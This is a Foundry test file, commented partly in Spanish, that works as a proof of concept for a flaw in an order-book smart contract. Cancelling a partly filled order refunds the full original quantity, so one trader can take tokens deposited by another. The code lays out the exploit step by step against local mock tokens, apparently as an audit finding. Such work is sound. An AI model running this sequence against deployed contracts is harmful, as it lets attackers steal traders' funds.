// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/OrderBookFactory.sol";
import "./MyTokenB.sol";
import "./MyTokenA.sol";
import "forge-std/console.sol";
import "../src/PairLib.sol";

contract OrderBookFactoryTest is Test {
    using PairLib for PairLib.TraderBalance;

    OrderBookFactory factory;

    //ADDRESS
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address trader1 = makeAddr("trader1");
    address trader2 = makeAddr("trader2");
    address trader3 = makeAddr("trader3");

    //TOKENS
    MyTokenA tokenA;
    MyTokenB tokenB;

    event OrderBookCreated(bytes32 indexed id, address indexed baseToken, address indexed quoteToken, address owner);

    event OrderBookFeeChanged(bytes32 indexed id, uint256 fee);

    event OrderBookFeeAddressChanged(bytes32 indexed id, address feeAddress);

    function setUp() public {
        vm.prank(owner);
        factory = new OrderBookFactory();

        //Creando token como suministro inicial
        tokenA = new MyTokenA(1_000_000e18); //Crear un nuevo token con suministro inicial
        tokenB = new MyTokenB(1_000_000e18); //Crear un nuevo token con suministro inicial
        //        console.log(address(factory));
        //        console.log(msg.sender);

        tokenA.transfer(trader1, 250_000e18);
        tokenA.transfer(trader2, 250_000e18);
        tokenB.transfer(trader1, 250_000e18);
        tokenB.transfer(trader2, 250_000e18);

        //Aprobar el contrato para que pueda gastar tokens
        vm.startPrank(trader1); // Cambiar el contexto a trader1
        tokenA.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        tokenB.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        vm.stopPrank();

        vm.startPrank(trader2); // Cambiar el contexto a trader1
        tokenB.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        tokenA.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        vm.stopPrank();

        vm.startPrank(address(factory)); // Cambiar el contexto a trader1
        tokenB.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        tokenA.approve(address(factory), 10_000_000e18); // Aprobar 1000000 tokens
        vm.stopPrank();
    }

    //For simplicity purposes token ratio(TokenA/TokenB) is 1:1 (price of 1e18)
    function testAvailableQuantityExploit() public {

        vm.prank(owner);
        factory.addPair(address(tokenA), address(tokenB), 5, feeAddress);
//Balance of both traders /both tokens prior to exploit
        uint256 tokenAtrader1 = tokenA.balanceOf(trader1);
        uint256 tokenBtrader1 = tokenB.balanceOf(trader1);
//Both traders have 250k balances on both tokens;
        console.log("Token A trader1 balance before: ", tokenAtrader1 / 1e18);
        console.log("Token B trader1 balance before: ", tokenBtrader1 / 1e18);
        uint256 tokenAtrader2 = tokenA.balanceOf(trader2);
        uint256 tokenBtrader2 = tokenB.balanceOf(trader2);
        console.log("Token A trader2 balance before: ", tokenAtrader2 / 1e18);
        console.log("Token B trader2 balance before: ", tokenBtrader2 / 1e18);
        uint256 price = 1e18;
        bytes32[] memory keys = factory.getPairIds();
//Trader1 is the victim, they place a buy order for a quantity of 10_000e18 tokens at a price of 1e18;
        vm.prank(trader1);
        factory.addNewOrder(keys[0], 10_000e18, price, true, 1);
//New balance of the quote token of trade 1
//Here trader1 has a 240k balance on tokenA (10k was transferred to factory);
        uint256 tokenAtrader1afterOrder = tokenA.balanceOf(trader1);
        console.log("Token A trader1 balance after order posted: ", tokenAtrader1afterOrder / 1e18);

        //Trader2 is the perpetrator, they place an order for 20_000e18, out of which 10_000e18 will be covered immediately from trader1's order and the other 10_000e18 will be part of the new
        vm.prank(trader2);
        factory.addNewOrder(keys[0], 20_000e18, price, false, 1);
        vm.prank(trader1);
        factory.withdrawBalanceTrader(keys[0], true);
//Balances of both traders after trader1's order is fully executed, balance withdrawn and trader 2's order is created for half of the amount
//Trader 1 will have a TokenA balance of 240K (-10K for the order), and a TokenB balance of 260k (+10K from the order executed);
        uint256 tokenAtrader1after = tokenA.balanceOf(trader1);
        uint256 tokenBtrader1after = tokenB.balanceOf(trader1);
//Trader 2 will have a TokenA balance of 259.9K (+ 9.9k from the order execution - fee), and a TokenB balance of 230k ();
        uint256 tokenAtrader2after = tokenA.balanceOf(trader2);
        uint256 tokenBtrader2after = tokenB.balanceOf(trader2);
        console.log("Token A trader1 balance after order execution: ", tokenAtrader1after / 1e18);
        console.log("Token B trader1 balance after order execution: ", tokenBtrader1after / 1e18);
        console.log("Token A trader2 balance after order execution: ", tokenAtrader2after / 1e18);
        console.log("Token B trader2 balance after order execution: ", tokenBtrader2after / 1e18);
//Trader1 (or other arbitrary user) places a sell order for 20_000e18
        vm.prank(trader1);
        factory.addNewOrder(keys[0], 20_000e18, 1e18, false, 1);
        uint256 nonce = 1;
        bytes32 _orderId = keccak256(abi.encodePacked(trader2, "sell", price, nonce));
//Trader2 exploits this by cancelling their order and gets 20_000e18 tokens back, instead of 10_000e18, this is because availableQuantity isn't decreased when the order was partially
        vm.prank(trader2);
        factory.cancelOrder(keys[0], _orderId);
        uint256 tokenAtrader2afterExp = tokenA.balanceOf(trader2);
        uint256 tokenBtrader2afterExp = tokenB.balanceOf(trader2);
        console.log("Token A trader2 balance after exploit: ", tokenAtrader2afterExp / 1e18);
        console.log("Token B trader2 balance after exploit: ", tokenBtrader2afterExp / 1e18);
//TokenA balance 259.9K, TokenB balance 250K (instead of 240k)
        assertEq(tokenBtrader2afterExp, 240_000e18, "Token B balance is different than expected");
    }

}